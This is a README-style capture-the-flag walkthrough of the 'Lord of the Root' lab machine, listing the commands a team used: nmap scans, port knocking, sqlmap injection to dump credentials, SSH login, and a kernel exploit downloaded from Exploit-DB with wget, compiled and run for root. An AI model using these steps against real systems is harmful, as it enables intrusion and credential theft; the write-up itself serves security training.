# DEPI-PROJECT
# LORD OF THE ROOT 🚀  

**"One does not simply walk into Mordor" – but today, we did.**  

This repository documents a complete penetration testing journey, filled with strategic reconnaissance, precise exploitation, and creative privilege escalation. Created in collaboration by **Osama, A.Essam, Ammar**, and team, this project reflects the team's ingenuity and persistence in the pursuit of root access.  

> **“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”**  
> – Gandalf  

---  

## 📖 Table of Contents  

- [About the Project](#about-the-project)  
- [Introduction](#introduction)  
- [Reconnaissance](#reconnaissance)  
  - [Identifying the Target](#identifying-the-target)  
  - [Port Knocking](#port-knocking)  
  - [Decoding Hidden Clues](#decoding-hidden-clues)  
- [Exploitation](#exploitation)  
  - [SQL Injection](#sql-injection)  
  - [Gaining Access](#gaining-access)  
- [Privilege Escalation](#privilege-escalation)  
- [The Final Flag](#the-final-flag)  
- [Lessons Learned](#lessons-learned)  
- [Acknowledgments](#acknowledgments)  

---  

## 💡 About the Project  

**LORD OF THE ROOT** is a simulated penetration testing exercise that showcases critical cybersecurity skills, including network discovery, vulnerability exploitation, and privilege escalation.  

This project is a testament to teamwork, persistence, and creative problem-solving in the field of cybersecurity.  

---

## 🔍 Introduction  

The journey begins with a challenge: break into the target machine, navigate its defenses, escalate privileges, and retrieve the coveted root flag.  

By employing methodical reconnaissance, identifying vulnerabilities, and crafting exploits, the team successfully navigates through the security layers of the system.  

---

## 🎯 Reconnaissance  

### Identifying the Target  

1. **Discovering the IP Address**  
   - Tool: `netdiscover`  
   - Result: Target's IP identified as **192.168.1.35**.  

2. **Initial Nmap Scan**  
   - Command:  
     ```bash
     nmap -sS -p- -Pn 192.168.1.35
     ```  
   - Outcome: Only **SSH (Port 22)** was open.  

### Port Knocking  

To uncover hidden ports, we used `knockit`:  
```bash
python Knockit.py 192.168.1.35 1 2 3
```  

- A new port **1337** was revealed.  

### Decoding Hidden Clues  

Examining the new service, we discovered Base64-encoded strings in the source code. These clues led us to potential endpoints:  

1. **First clue:**  
   ```bash
   hURL -b THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh
   ```  

2. **Second clue:**  
   ```bash
   hURL -b Lzk3ODM0NTIxMC9pbmRleC5waHA=
   ```  

---

## 💻 Exploitation  

### SQL Injection  

After identifying vulnerable endpoints, we captured an HTTP request into `MEDO.req` for further analysis:  
```plaintext
POST /978345210/index.php HTTP/1.1  
Host: 192.168.1.35:1337  
...
username=admin&password=password&submit=Login
```  

- Used **SQLMap** to exploit the injection point and extract database information:  
  ```bash
  sqlmap -r MEDO.req --dbs --dump --flush-session --batch --level=5
  ```  

### Gaining Access  

Using the credentials retrieved via SQLMap, we logged into the system as `smeagol`:  
```bash
ssh smeagol@192.168.1.35
```  

**We’re in!**  

---

## 🔑 Privilege Escalation  

1. **Kernel Version Check**  
   - Identified the kernel version to search for a compatible exploit.  

2. **Finding the Exploit**  
   - Located a privilege escalation exploit on **Exploit-DB**.  

3. **Compiling and Executing the Exploit**  
   - Commands:  
     ```bash
     wget https://www.exploit-db.com/download/39166
     gcc 39166.c -o medo
     ./medo
     ```  

**Root access achieved!**  

---

## 🏆 The Final Flag  

Navigated to the root directory:  
```bash
cd /root  
cat Flag.txt  
```  

**Flag Content:**  
> “There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”  

---

## 📘 Lessons Learned  

1. **Reconnaissance**  
   - Tools like `netdiscover` and `nmap` are invaluable for identifying network details.  

2. **Exploitation**  
   - SQL injection remains a critical vulnerability and emphasizes the importance of secure coding practices.  

3. **Privilege Escalation**  
   - Kernel exploits demonstrate the need for regular system updates and patches.  

---

## 🙏 Acknowledgments  

This project is a collaborative effort by **Osama, A.Essam, Ammar**, and team. Together, we tackled challenges, explored vulnerabilities, and achieved our goals.  

> **Let’s hack the planet! 🚀**  

